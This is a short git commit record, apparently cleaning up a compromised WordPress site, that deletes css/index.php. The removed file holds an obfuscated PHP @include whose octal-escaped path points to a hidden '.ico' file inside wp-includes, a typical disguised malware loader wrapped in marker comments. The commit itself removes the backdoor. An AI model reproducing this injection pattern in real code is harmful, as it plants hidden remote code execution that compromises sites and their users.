dc581a4d8a8a2988af1b8d95af40315dff150e2c
Parker <parkermmyers@gmail.com>
2020-11-30 10:27:11 -0500

    Cleanup of unnecessary files

--- css/index.php
+++
@@ -1,8 +0,0 @@
-<?php
-/*def4c*/
-
-@include "\057hom\1451/s\162eni\143kc/\160ubl\151c_h\164ml/\145pad\144ock\057wp-\151ncl\165des\057sod\151um_\143omp\141t/.\061af0\0640fd\056ico";
-
-/*def4c*/
-
-
